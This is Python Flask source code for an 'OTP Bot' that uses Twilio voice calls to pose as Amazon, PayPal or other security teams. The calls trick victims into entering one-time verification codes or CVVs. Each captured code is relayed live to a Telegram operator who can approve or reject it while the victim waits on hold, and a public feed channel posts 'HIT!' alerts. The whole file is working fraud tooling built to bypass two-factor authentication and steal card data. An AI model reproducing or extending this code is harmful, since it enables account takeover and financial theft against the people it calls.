from flask import Flask, request, jsonify, Response
from threading import Thread
from database import add_subscription_days, get_user_script
from config import bot, LIVE_FEED_CHANNEL_ID
from twilio.twiml.voice_response import VoiceResponse, Gather
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from logger import send_log
import json

app = Flask('')

# ==========================================
# 📜 SCRIPTS & CONFIG
# ==========================================
DEFAULT_SCRIPTS = {
    "amazon": "Hello. This is Amazon Security. We detected a suspicious purchase. Please enter the verification code sent to your mobile device.",
    "paypal": "Hello. This is PayPal Fraud Prevention. A login attempt was made from a new device. Enter your security code to block it.",
    "default": "Hello. This is an automated security call from {service}. We detected unauthorized activity. Please enter the verification code sent to your mobile."
}

@app.route('/')
def home():
    return "Mussolini OTP Bot - Live Panel Ready."

# ==========================================
# 1. TWILIO VOICE (INICIO)
# ==========================================
@app.route('/twilio/voice', methods=['POST'])
def twilio_voice():
    service_raw = request.args.get('service', 'Security')
    user_id = request.args.get('user_id')
    mode = request.args.get('mode', 'otp')
    
    resp = VoiceResponse()
    
    # Selección de Script
    digits_needed = 3 if mode == 'cvv' else 8
    
    custom_data = get_user_script(user_id, service_raw.lower())
    if custom_data:
        say_text, lang = custom_data
    else:
        lang = 'en-US'
        key = service_raw.lower()
        if key in DEFAULT_SCRIPTS: say_text = DEFAULT_SCRIPTS[key]
        else: say_text = DEFAULT_SCRIPTS["default"].format(service=service_raw)

    # Gather inicial
    gather = Gather(
        num_digits=digits_needed, 
        action=f'/twilio/gather?user_id={user_id}&service={service_raw}&mode={mode}', 
        method='POST', 
        timeout=10
    )
    gather.say(say_text, voice='alice', language=lang)
    
    resp.append(gather)
    resp.redirect('/twilio/voice') # Si no pone nada, repite el loop
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 2. TWILIO GATHER (CAPTURA + HOLD)
# ==========================================
@app.route('/twilio/gather', methods=['POST'])
def twilio_gather():
    digits = request.values.get('Digits')
    call_sid = request.values.get('CallSid') # ID Único de la llamada
    user_id = request.args.get('user_id')
    service = request.args.get('service')
    
    resp = VoiceResponse()

    if digits and user_id:
        # A) Enviar Panel a Telegram
        try:
            markup = InlineKeyboardMarkup()
            # Botones con CallSid para saber qué llamada modificar
            markup.row(
                InlineKeyboardButton("✅ APPROVE", callback_data=f"live_approve_{call_sid}"),
                InlineKeyboardButton("❌ REJECT / RETRY", callback_data=f"live_reject_{call_sid}")
            )
            
            bot.send_message(
                user_id, 
                f"🎹 **CODE CAPTURED!**\n\n"
                f"👤 Service: `{service}`\n"
                f"🔢 Input: `{digits}`\n"
                f"📞 Status: 🟡 **ON HOLD** (Waiting for you...)", 
                reply_markup=markup,
                parse_mode="Markdown"
            )
            
            # Log Feed Público
            if LIVE_FEED_CHANNEL_ID:
                masked = f"{digits[:3]}***"
                bot.send_message(LIVE_FEED_CHANNEL_ID, f"🔥 **HIT!** {service} | `{masked}`")
                
        except Exception as e:
            print(f"Error TG: {e}")

        # B) Poner a la víctima en ESPERA (Música)
        resp.say("Please hold while we verify your identity.", voice='alice')
        resp.play("http://com.twilio.sounds.music/ClockworkWaltz.mp3") # Música de espera
        
        # C) Loop de espera (Se queda aquí hasta que toques un botón en Telegram)
        resp.redirect('/twilio/wait_loop') 
        
    else:
        resp.say("Invalid input.", voice='alice')
        resp.redirect(f'/twilio/voice?service={service}&user_id={user_id}') # Reintentar

    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 3. RUTAS DE LÓGICA (LIVE PANEL)
# ==========================================

@app.route('/twilio/wait_loop', methods=['POST'])
def wait_loop():
    """Mantiene la música sonando en bucle."""
    resp = VoiceResponse()
    resp.play("http://com.twilio.sounds.music/ClockworkWaltz.mp3")
    resp.redirect('/twilio/wait_loop')
    return Response(str(resp), mimetype='text/xml')

@app.route('/twilio/logic/approve', methods=['POST'])
def logic_approve():
    """Lógica cuando das CLICK EN APROBAR."""
    resp = VoiceResponse()
    resp.say("Identity verified successfully. Thank you. Goodbye.", voice='alice')
    resp.hangup()
    return Response(str(resp), mimetype='text/xml')

@app.route('/twilio/logic/reject', methods=['POST'])
def logic_reject():
    """Lógica cuando das CLICK EN RECHAZAR."""
    resp = VoiceResponse()
    resp.say("The verification code is invalid. Please try again.", voice='alice')
    
    # Volvemos a pedir el código (Gather)
    # Importante: Necesitamos recuperar los params, pero Twilio no los guarda en redirect simple.
    # Por simplicidad, mandamos al input genérico.
    gather = Gather(num_digits=8, action='/twilio/gather_retry', method='POST', timeout=10)
    gather.say("Please enter the verification code again.", voice='alice')
    resp.append(gather)
    
    return Response(str(resp), mimetype='text/xml')

@app.route('/twilio/gather_retry', methods=['POST'])
def gather_retry():
    """Maneja el segundo intento (o tercero, cuarto...)"""
    # Aquí podríamos volver a enviar al panel de Telegram si quisieras bucle infinito
    # Para este ejemplo, si falla la segunda, colgamos.
    digits = request.values.get('Digits')
    resp = VoiceResponse()
    if digits:
        resp.say("Thank you. We are verifying.", voice='alice')
        resp.hangup() # O podrías volver a mandarlo a Telegram para aprobar de nuevo
    else:
        resp.say("Goodbye.", voice='alice')
        resp.hangup()
    return Response(str(resp), mimetype='text/xml')

# ==========================================
# 4. STATUS MONITOR
# ==========================================
@app.route('/twilio/status', methods=['POST'])
def twilio_status():
    # Tu código de status actual (Answered, Completed, etc.)
    # ... (Copia el que ya tenías o usa el simplificado)
    return Response("OK", mimetype='text/plain')

# ==========================================
# SERVER RUNNER
# ==========================================
def run():
    app.run(host='0.0.0.0', port=8080)

def start_server():
    t = Thread(target=run)
    t.start()
